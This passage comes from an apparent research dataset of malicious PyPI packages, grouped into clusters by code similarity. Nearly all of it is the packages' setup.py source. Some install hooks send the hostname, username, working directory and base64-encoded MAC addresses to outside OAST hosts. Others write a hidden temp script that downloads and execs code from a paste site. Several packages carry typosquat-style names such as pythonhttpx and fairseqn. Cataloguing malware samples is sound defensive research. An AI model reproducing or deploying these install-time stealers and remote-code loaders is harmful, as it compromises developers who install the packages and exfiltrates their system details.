        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"uuss\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"uuss\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-mnolith-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"mnolith\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"mnolith\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      }
    ]
  },
  {
    "cluster_id": 5,
    "size": 11,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-pydiscordion-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/vrdpn/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pydiscordion',\n    packages=['pydiscordion'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/vrdpn/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-pyproxyx-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/kscdw/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\n\nsetup(\n    name='pyproxyx',\n    packages=['pyproxyx'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/vrdpn/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-etlisalat-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/9zyhb/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='etlisalat',\n    packages=['etlisalat'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/9zyhb/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-13-tlsproxies-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/qv66j/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='tlsproxies',\n    packages=['tlsproxies'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-23-pycapmonster-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/qgu3e/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pycapmonster',\n    packages=['pycapmonster'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/qgu3e/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-23-pythoncaptchasolver-v2.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/bjhtk/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pythoncaptchasolver',\n    packages=['pythoncaptchasolver'],\n    version='2.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/yg9e5/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-29-pythonhttpx-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/tdqnk/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pythonhttpx',\n    packages=['pythonhttpx'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/yg9e5/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-pystylerio-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/9zyhb/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='pystylerio',\n    packages=['pystylerio'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/9zyhb/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-06-colorstyle-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/m3qfu/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='colorstyle',\n    packages=['colorstyle'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/xnouv/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-06-xboxkeyauth-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/m3qfu/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='xboxkeyauth',\n    packages=['xboxkeyauth'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/xnouv/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-11-pybetterascii-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/o42cc/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='pybetterascii',\n    packages=['pybetterascii'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n"
      }
    ]
  },
  {
    "cluster_id": 6,
    "size": 81,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-adanbu-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Adanbu\",\n    version=\"92.6\",\n    author=\"123\",\n    author_email=\"xxx@outlook.com\",\n    description=\"321\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"None\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-adandu-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Adandu\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-adandv-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"adandv\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-distpro-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"DistPro\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-fairseqn-v92.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"fairseqn\",\n    version=\"92.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-fairsequence-v91.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == 